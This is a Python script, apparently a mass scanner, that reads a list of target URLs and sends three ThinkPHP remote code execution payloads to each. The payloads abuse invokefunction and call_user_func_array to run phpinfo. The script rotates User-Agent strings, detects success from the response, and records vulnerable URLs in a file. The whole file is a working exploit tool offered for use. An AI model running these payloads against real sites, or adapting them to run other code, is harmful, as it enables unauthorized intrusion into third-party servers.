'''
@Description: 
@Author: Sp4ce
@Github: https://github.com/NS-Sp4ce
@LastEditors: Sp4ce
@Date: 2019-03-17 12:37:19
@LastEditTime: 2019-03-17 12:40:52
'''

import os
import sys
import requests
import queue
import threading
from random import choice
from bs4 import BeautifulSoup


'''
USER_AGENTS 随机头信息
'''

USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
]

headers = {'User-Agent': choice(USER_AGENTS)}  # 随机UA

PAYLOAD = [
    "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo();",
    "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    "?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
]#3个检测POC

MAX_TIME_OUT = 3#超时时间

class thinkphp_rce(threading.Thread):
    def __init__(self, q):
        threading.Thread.__init__(self)#多线程初始化
        self.q= q
    def run(self):
        while not self.q.empty():
            url = self.q.get()
            headers = {'User-Agent': choice(USER_AGENTS)}  # 随机UA
            for i in PAYLOAD:
                payload= i
                #print(payload)
                vulnurl= url + payload#漏洞url
                try:
                    response= requests.get(vulnurl, headers=headers, timeout=MAX_TIME_OUT, verify=False, allow_redirects=False)
                    soup = BeautifulSoup(response.text, "lxml")#解析响应
                    if 'PHP Version' in str(soup.text):
                        #检测特征
                        print(
                            '[+] 检测到存在漏洞\n[+] Payload=> '+payload+'\n')
                        print('\n[+] 漏洞URL: ' + vulnurl)
                        with open('target.txt', 'a') as f1:
                            #写入文件
                            f1.write(vulnurl+'\n')
                        f1.close()
                    else:
                        print(
                            '\n[-] Payload=> '+payload+' 未检测到漏洞')
                except:
                    print('\n[!] 无法连接到目标'+ url)
            continue

def urlget():
    try:
        with open('url.txt', 'r')as f:
            urls = f.readlines()#按行读取
            for tmp in urls:
                if '//' in tmp:
                    url = tmp.strip('\n')
                    urlList.append(url)
                else:
                    url = 'http://'+tmp.strip('\n')
                    urlList.append(url)
            return(urlList)
    except:
        print(r'''
                           _   _                      
                          | | | |___  __ _  __ _  ___ 
                          | | | / __|/ _` |/ _` |/ _ \
                          | |_| \__ \ (_| | (_| |  __/
                           \___/|___/\__,_|\__, |\___|
                                           |___/      
        1.在本脚本目录下新建url.txt
        2.把要检测的URL放进去
        3.运行脚本
        ''')

    
    
if __name__ == "__main__":
    print(r'''

      _____ _     _       _    ____  _   _ ____    ____  __  __  ____            _____            
     |_   _| |__ (_)_ __ | | _|  _ \| | | |  _ \  | ___| \ \/ / |  _ \ ___ ___  | ____|_  ___ __  
       | | | '_ \| | '_ \| |/ / |_) | |_| | |_) | |___ \  \  /  | |_) / __/ _ \ |  _| \ \/ / '_ \ 
       | | | | | | | | | |   <|  __/|  _  |  __/   ___) | /  \  |  _ < (_|  __/ | |___ >  <| |_) |
       |_| |_| |_|_|_| |_|_|\_\_|   |_| |_|_|     |____(_)_/\_\ |_| \_\___\___| |_____/_/\_\ .__/ 
                                                                                           |_|    

                                                                                -By:Sp4ce
                                                                            Thanks To:@tdcoming

            ''')
    urlList = []
    urlget()
    threads= []
    threads_count= 1#线程数量
    q = queue.Queue()
    for url in urlList:
        q.put(url)
    for i in range(threads_count):
        threads.append(thinkphp_rce(q))
    for i in threads:
        i.start()
    for i in threads:
        i.join()
